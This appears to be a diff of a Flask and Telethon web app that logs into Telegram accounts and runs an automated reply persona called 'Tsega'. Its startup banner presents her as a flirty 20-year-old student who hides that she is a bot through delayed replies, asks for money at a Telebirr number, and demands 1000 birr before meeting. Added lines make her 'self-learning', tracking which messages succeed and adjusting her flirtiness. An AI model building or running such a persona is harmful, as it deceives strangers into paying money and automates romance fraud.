-    return jsonify({'success': True, 'accounts': formatted})
-
-# FIXED: Simplified add-account route with better error handling
-@app.route('/api/add-account', methods=['POST'])
-def add_account():
-    try:
-        data = request.json
-        if not data:
-            return jsonify({'success': False, 'error': 'No JSON data received'})
-        
-        phone = data.get('phone')
-        if not phone:
-            return jsonify({'success': False, 'error': 'Phone number required'})
-        
-        if not phone.startswith('+'):
-            phone = '+' + phone
-        
-        logger.info(f"Adding account for phone: {phone}")
-        
-        async def send_code():
-            client = TelegramClient(
-                StringSession(), 
-                API_ID, 
-                API_HASH,
-                connection_retries=3,
-                retry_delay=1,
-                timeout=15
-            )
-            try:
-                await client.connect()
-                logger.info(f"Connected to Telegram for {phone}")
-                
-                result = await client.send_code_request(phone)
-                logger.info(f"Code sent successfully to {phone}")
-                
-                session_id = str(int(time.time()))
-                temp_sessions[session_id] = {
-                    'phone': phone,
-                    'hash': result.phone_code_hash,
-                    'session': client.session.save()
-                }
-                return {'success': True, 'session_id': session_id}
-                
-            except errors.FloodWaitError as e:
-                logger.warning(f"Flood wait for {phone}: {e.seconds}s")
-                return {'success': False, 'error': f'Please wait {e.seconds} seconds'}
-            except errors.PhoneNumberInvalidError:
-                return {'success': False, 'error': 'Invalid phone number'}
-            except errors.PhoneNumberBannedError:
-                return {'success': False, 'error': 'This phone number is banned'}
-            except (OSError, ConnectionError, TimeoutError) as e:
-                logger.error(f"Network error for {phone}: {e}")
-                return {'success': False, 'error': 'Network error. Cannot reach Telegram servers.'}
-            except Exception as e:
-                logger.error(f"Unexpected error for {phone}: {e}")
-                return {'success': False, 'error': str(e)}
-            finally:
-                await client.disconnect()
-        
-        result = run_async(send_code())
-        return jsonify(result)
-        
-    except Exception as e:
-        logger.error(f"Error in add_account: {e}")
-        return jsonify({'success': False, 'error': f'Server error: {str(e)}'})
-
-@app.route('/api/verify-code', methods=['POST'])
-def verify_code():
-    data = request.json
-    code = data.get('code')
-    session_id = data.get('session_id')
-    password = data.get('password', '')
-    
-    if not code or not session_id:
-        return jsonify({'success': False, 'error': 'Missing code or session'})
-    
-    if session_id not in temp_sessions:
-        return jsonify({'success': False, 'error': 'Session expired'})
-    
-    session_data = temp_sessions[session_id]
-    
-    async def verify():
-        client = TelegramClient(StringSession(session_data['session']), API_ID, API_HASH)
-        await client.connect()
-        
-        try:
-            try:
-                await client.sign_in(
-                    session_data['phone'], 
-                    code, 
-                    phone_code_hash=session_data['hash']
-                )
-            except errors.SessionPasswordNeededError:
-                if not password:
-                    return {'need_password': True}
-                await client.sign_in(password=password)
-            
-            me = await client.get_me()
-            
-            new_id = 1
-            if accounts:
-                new_id = max([a['id'] for a in accounts]) + 1
-            
-            new_account = {
-                'id': new_id,
-                'phone': me.phone or session_data['phone'],
-                'name': me.first_name or 'User',
-                'session': client.session.save()
-            }
-            
-            accounts.append(new_account)
-            save_accounts()
-            
-            return {'success': True}
-            
-        except errors.PhoneCodeInvalidError:
-            return {'success': False, 'error': 'Invalid code'}
-        except errors.PhoneCodeExpiredError:
-            return {'success': False, 'error': 'Code expired'}
-        except errors.PasswordHashInvalidError:
-            return {'success': False, 'error': 'Invalid password'}
-        except Exception as e:
-            return {'success': False, 'error': str(e)}
-        finally:
-            await client.disconnect()
-    
-    try:
-        result = run_async(verify())
-        
-        if session_id in temp_sessions:
-            del temp_sessions[session_id]
-        
-        return jsonify(result)
-    except Exception as e:
-        return jsonify({'success': False, 'error': str(e)})
-
-@app.route('/api/get-messages', methods=['POST'])
-def get_messages():
-    data = request.json
-    account_id = data.get('accountId')
-    
-    if not account_id:
-        return jsonify({'success': False, 'error': 'Account ID required'})
-    
-    account = next((acc for acc in accounts if acc['id'] == account_id), None)
-    
-    if not account:
-        return jsonify({'success': False, 'error': 'Account not found'})
-    
-    async def fetch():
-        client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
-        await client.connect()
-        
-        try:
-            if not await client.is_user_authorized():
-                return {'success': False, 'error': 'auth_key_unregistered'}
-            
-            dialogs = await client.get_dialogs()
-            
-            chats = []
-            for dialog in dialogs:
-                if not dialog:
-                    continue
-                
-                chat_type = 'user'
-                if dialog.is_group:
-                    chat_type = 'group'
-                elif dialog.is_channel:
-                    chat_type = 'channel'
-                
-                chat = {
-                    'id': str(dialog.id),
-                    'title': dialog.name or 'Unknown',
-                    'type': chat_type,
-                    'unread': dialog.unread_count or 0,
-                    'lastMessage': '',
-                    'lastMessageDate': 0
-                }
-                
-                if dialog.message:
-                    if dialog.message.text:
-                        chat['lastMessage'] = dialog.message.text[:50]
-                    elif dialog.message.media:
-                        chat['lastMessage'] = '📎 Media'
-                    
-                    if dialog.message.date:
-                        chat['lastMessageDate'] = int(dialog.message.date.timestamp())
-                
-                chats.append(chat)
-            
-            return {'success': True, 'chats': chats}
-            
-        except AuthKeyUnregisteredError:
-            remove_invalid_account(account_id)
-            return {'success': False, 'error': 'auth_key_unregistered'}
-        except Exception as e:
-            return {'success': False, 'error': str(e)}
-        finally:
-            await client.disconnect()
-    
-    try:
-        result = run_async(fetch())
-        return jsonify(result)
-    except Exception as e:
-        return jsonify({'success': False, 'error': str(e)})
-
-@app.route('/api/send-message', methods=['POST'])
-def send_message():
-    data = request.json
-    account_id = data.get('accountId')
-    chat_id = data.get('chatId')
-    message = data.get('message')
-    
-    if not account_id or not chat_id or not message:
-        return jsonify({'success': False, 'error': 'Missing required fields'})
-    
-    account = next((acc for acc in accounts if acc['id'] == account_id), None)
-    
-    if not account:
-        return jsonify({'success': False, 'error': 'Account not found'})
-    
-    async def send():
-        client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
-        await client.connect()
-        
-        try:
-            if not await client.is_user_authorized():
-                return {'success': False, 'error': 'auth_key_unregistered'}
-            
-            try:
-                entity = await client.get_entity(int(chat_id))
-            except:
-                try:
-                    entity = await client.get_entity(chat_id)
-                except:
-                    return {'success': False, 'error': 'Chat not found'}
-            
-            await client.send_message(entity, message)
-            return {'success': True}
-            
-        except Exception as e:
-            return {'success': False, 'error': str(e)}
-        finally:
-            await client.disconnect()
-    
-    try:
-        result = run_async(send())
-        return jsonify(result)
-    except Exception as e:
-        return jsonify({'success': False, 'error': str(e)})
-
-@app.route('/api/remove-account', methods=['POST'])
-def remove_account():
-    data = request.json
-    account_id = data.get('accountId')
-    
-    if not account_id:
-        return jsonify({'success': False, 'error': 'Account ID required'})
-    
-    global accounts
-    
-    stop_auto_reply_for_account(account_id)
-    
-    original_len = len(accounts)
-    accounts = [acc for acc in accounts if acc['id'] != account_id]
-    
-    if len(accounts) < original_len:
-        save_accounts()
-        return jsonify({'success': True})
-    
-    return jsonify({'success': False, 'error': 'Account not found'})
-
-@app.route('/api/reply-settings', methods=['GET'])
-def get_reply_settings():
-    account_id = request.args.get('accountId')
-    
-    if not account_id:
-        return jsonify({'success': False, 'error': 'Account ID required'})
-    
-    account_key = str(account_id)
-    settings = reply_settings.get(account_key, {
-        'enabled': False,
-        'chats': {}
-    })
-    
-    return jsonify({'success': True, 'settings': settings})
-
-@app.route('/api/reply-settings', methods=['POST'])
-def update_reply_settings():
-    data = request.json
-    account_id = data.get('accountId')
-    enabled = data.get('enabled', False)
-    chat_settings = data.get('chats', {})
-    
-    if not account_id:
-        return jsonify({'success': False, 'error': 'Account ID required'})
-    
-    account_key = str(account_id)
-    
-    if account_key not in reply_settings:
-        reply_settings[account_key] = {}
-    
-    was_enabled = reply_settings[account_key].get('enabled', False)
-    reply_settings[account_key]['enabled'] = enabled
-    reply_settings[account_key]['chats'] = chat_settings
-    
-    save_reply_settings()
-    
-    # Start or stop based on new setting
-    if enabled and not was_enabled:
-        account = next((acc for acc in accounts if acc['id'] == account_id), None)
-        if account and account_key not in active_clients:
-            thread = threading.Thread(
-                target=lambda: run_async(start_auto_reply_for_account(account)),
-                daemon=True
-            )
-            thread.start()
-            client_tasks[account_key] = thread
-            logger.info(f"Started auto-reply for account {account_id}")
-    elif not enabled and was_enabled:
-        stop_auto_reply_for_account(account_id)
-    
-    return jsonify({'success': True, 'message': 'Settings updated'})
-
-@app.route('/api/toggle-chat-reply', methods=['POST'])
-def toggle_chat_reply():
-    data = request.json
-    account_id = data.get('accountId')
-    chat_id = data.get('chatId')
-    enabled = data.get('enabled', True)
-    
-    if not account_id or not chat_id:
-        return jsonify({'success': False, 'error': 'Account ID and Chat ID required'})
-    
-    account_key = str(account_id)
-    
-    if account_key not in reply_settings:
-        reply_settings[account_key] = {'enabled': False, 'chats': {}}
-    
-    if 'chats' not in reply_settings[account_key]:
-        reply_settings[account_key]['chats'] = {}
-    
-    reply_settings[account_key]['chats'][str(chat_id)] = {'enabled': enabled}
-    
-    save_reply_settings()
-    
-    return jsonify({'success': True, 'message': f'Auto-reply for chat {"enabled" if enabled else "disabled"}'})
-
-@app.route('/api/conversation-history', methods=['GET'])
-def get_conversation_history():
-    account_id = request.args.get('accountId')
-    chat_id = request.args.get('chatId')
-    
-    if not account_id or not chat_id:
-        return jsonify({'success': False, 'error': 'Account ID and Chat ID required'})
-    
-    account_key = str(account_id)
-    chat_key = str(chat_id)
-    
-    history = []
-    if account_key in conversation_history and chat_key in conversation_history[account_key]:
-        history = conversation_history[account_key][chat_key]
-    
-    return jsonify({'success': True, 'history': history})
-
-@app.route('/api/clear-history', methods=['POST'])
-def clear_conversation_history():
-    data = request.json
-    account_id = data.get('accountId')
-    chat_id = data.get('chatId')
-    
-    if not account_id or not chat_id:
-        return jsonify({'success': False, 'error': 'Account ID and Chat ID required'})
-    
-    account_key = str(account_id)
-    chat_key = str(chat_id)
-    
-    if account_key in conversation_history and chat_key in conversation_history[account_key]:
-        conversation_history[account_key][chat_key] = []
-        save_conversation_history()
-    
-    return jsonify({'success': True, 'message': 'History cleared'})
-
-@app.route('/api/get-sessions', methods=['POST'])
-def get_sessions():
-    data = request.json
-    account_id = data.get('accountId')
-    
-    if not account_id:
-        return jsonify({'success': False, 'error': 'Account ID required'})
-    
-    account = next((acc for acc in accounts if acc['id'] == account_id), None)
-    
-    if not account:
-        return jsonify({'success': False, 'error': 'Account not found'})
-    
-    async def get_sessions():
-        client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
-        await client.connect()
-        
-        try:
-            result = await client(functions.account.GetAuthorizationsRequest())
-            
-            sessions = []
-            current_hash = None
-            
-            for auth in result.authorizations:
-                session_info = {
-                    'hash': auth.hash,
-                    'device_model': auth.device_model,
-                    'platform': auth.platform,
-                    'system_version': auth.system_version,
-                    'api_id': auth.api_id,
-                    'app_name': auth.app_name,
-                    'app_version': auth.app_version,
-                    'date_created': auth.date_created,
-                    'date_active': auth.date_active,
-                    'ip': auth.ip,
-                    'country': auth.country,
-                    'region': auth.region,
-                    'current': auth.current
-                }
-                
-                if auth.current:
-                    current_hash = auth.hash
-                
-                sessions.append(session_info)
-            
-            return {'success': True, 'sessions': sessions, 'current_hash': current_hash}
-            
-        except FreshResetAuthorisationForbiddenError:
-            return {'success': False, 'error': 'fresh_reset_forbidden'}
-        except Exception as e:
-            return {'success': False, 'error': str(e)}
-        finally:
-            await client.disconnect()
-    
-    try:
-        result = run_async(get_sessions())
-        return jsonify(result)
-    except Exception as e:
-        return jsonify({'success': False, 'error': str(e)})
-
-@app.route('/api/terminate-session', methods=['POST'])
-def terminate_session():
-    data = request.json
-    account_id = data.get('accountId')
-    session_hash = data.get('hash')
-    
-    if not account_id or not session_hash:
-        return jsonify({'success': False, 'error': 'Account ID and session hash required'})
-    
-    account = next((acc for acc in accounts if acc['id'] == account_id), None)
-    
-    if not account:
-        return jsonify({'success': False, 'error': 'Account not found'})
-    
-    async def terminate():
-        client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
-        await client.connect()
-        
-        try:
-            await client(functions.account.ResetAuthorizationRequest(int(session_hash)))
-            return {'success': True}
-        except Exception as e:
-            return {'success': False, 'error': str(e)}
-        finally:
-            await client.disconnect()
-    
-    try:
-        result = run_async(terminate())
-        return jsonify(result)
-    except Exception as e:
-        return jsonify({'success': False, 'error': str(e)})
-
-@app.route('/api/terminate-sessions', methods=['POST'])
-def terminate_sessions():
-    data = request.json
-    account_id = data.get('accountId')
-    
-    if not account_id:
-        return jsonify({'success': False, 'error': 'Account ID required'})
-    
-    account = next((acc for acc in accounts if acc['id'] == account_id), None)
-    
-    if not account:
-        return jsonify({'success': False, 'error': 'Account not found'})
-    
-    async def terminate():
-        client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
-        await client.connect()
-        
-        try:
-            result = await client(functions.account.GetAuthorizationsRequest())
-            
-            current_hash = None
-            for auth in result.authorizations:
-                if auth.current:
-                    current_hash = auth.hash
-                    break
-            
-            count = 0
-            for auth in result.authorizations:
-                if auth.hash != current_hash:
-                    try:
-                        await client(functions.account.ResetAuthorizationRequest(auth.hash))
-                        count += 1
-                    except:
-                        continue
-            
-            return {'success': True, 'message': f'Terminated {count} sessions'}
-            
-        except Exception as e:
-            return {'success': False, 'error': str(e)}
-        finally:
-            await client.disconnect()
-    
-    try:
-        result = run_async(terminate())
-        return jsonify(result)
-    except Exception as e:
-        return jsonify({'success': False, 'error': str(e)})
-
-@app.route('/api/reconnect', methods=['GET'])
-def reconnect_all():
-    """Force reconnect all accounts"""
-    for account_key in list(active_clients.keys()):
-        stop_auto_reply_for_account(int(account_key))
-    
-    time.sleep(2)
-    start_all_auto_replies()
-    
-    return jsonify({
-        'success': True,
-        'message': 'Reconnecting all accounts',
-        'active': len(active_clients)
-    })
-
-@app.route('/api/health', methods=['GET'])
-def health_check():
-    return jsonify({
-        'status': 'healthy',
-        'accounts': len(accounts),
-        'auto_reply_active': len(active_clients),
-        'active_accounts': list(active_clients.keys()),
-        'time': datetime.now().isoformat()
-    })
+        time.sleep(240)
 
 # ==================== STARTUP ====================
 
 def start_auto_reply_thread():
-    """Start auto-reply in background after server starts"""
+    """Start auto-reply in background"""
     time.sleep(5)
-    logger.info("Starting auto-reply for enabled accounts...")
+    logger.info("Starting self-learning Tsega for enabled accounts...")
     start_all_auto_replies()
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
     
     print('\n' + '='*70)
-    print('🤖 TSEGA - SEXY TELEGRAM AUTO-REPLY')
+    print('🤖 TSEGA - SELF-LEARNING TELEGRAM PERSONALITY')
     print('='*70)
     print(f'✅ Port: {port}')
     print(f'✅ Accounts loaded: {len(accounts)}')
+    print(f'✅ Learning data: {len(learning_data)} accounts')
     
     for acc in accounts:
         status = "ENABLED" if str(acc['id']) in reply_settings and reply_settings[str(acc['id'])].get('enabled') else "DISABLED"
-        print(f'   • {acc.get("name")} ({acc.get("phone")}) - {status}')
+        learned = "✓" if str(acc['id']) in learning_data else " "
+        print(f'   • {acc.get("name")} ({acc.get("phone")}) - {status} [Learned:{learned}]')
     
     print('='*70)
-    print('🚀 TSEGA FEATURES:')
-    print('   • Talks in Amharic with English translation')
-    print('   • Sexy and flirty personality 😘')
-    print('   • 15-40 second reply delay (human-like)')
-    print('   • Telebirr: 0940980555 for money requests')
-    print('   • Meet condition: 1000 birr with screenshot')
-    print('   • Lives in Jemo, from Adama')
-    print('   • Grade 12 student, 20 years old')
-    print('   • Refuses voice calls, prefers meeting')
+    print('🚀 SELF-LEARNING FEATURES:')
+    print('   • Learns from every conversation')
+    print('   • Evolves personality based on what works')
+    print('   • Remembers user preferences per user')
+    print('   • Tracks successful vs ignored messages')
+    print('   • Adapts flirty level based on responses')
+    print('   • Learns new phrases from users')
+    print('   • Hourly personality evolution')
+    print('   • Tracks emoji effectiveness')
     print('='*70 + '\n')
     
     # Start keep-alive
